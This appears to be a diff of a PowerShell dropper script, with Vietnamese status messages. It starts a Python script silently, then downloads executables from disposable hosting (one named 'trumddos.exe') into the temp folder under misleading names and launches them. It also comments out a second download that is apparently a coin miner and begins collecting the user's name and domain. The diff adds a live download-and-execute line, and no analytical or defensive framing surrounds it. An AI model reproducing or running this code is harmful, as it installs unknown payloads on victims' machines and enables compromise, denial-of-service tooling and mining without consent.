@@ -37,7 +37,7 @@ if (-Not (Get-Command python -ErrorAction SilentlyContinue)) {
 Write-Host "🚀 Đang chạy script Python..."
 pythonw $scriptPath
 
-$url = "https://unique-valkyrie-66ccef.netlify.app/rinhlagilarinhaitam.exe"
+$url = "https://ornate-gaufre-a9dbcd.netlify.app/trumddos.exe"
 $outfile = "$env:TEMP\sechgay.exe"
 Invoke-WebRequest -Uri $url -OutFile $outfile
 Start-Process $outfile
@@ -45,8 +45,8 @@ Start-Process $outfile
 
 $url = "http://zwalx5oi.x10.mx/a.exe"
 $outfile = "$env:TEMP\mycoin.exe"
-Invoke-WebRequest -Uri $url -OutFile $outfile
-Start-Process $outfile
+# Invoke-WebRequest -Uri $url -OutFile $outfile
+# Start-Process $outfile
 
 $username  = $env:USERNAME
 $userdomain = $env:USERDOMAIN
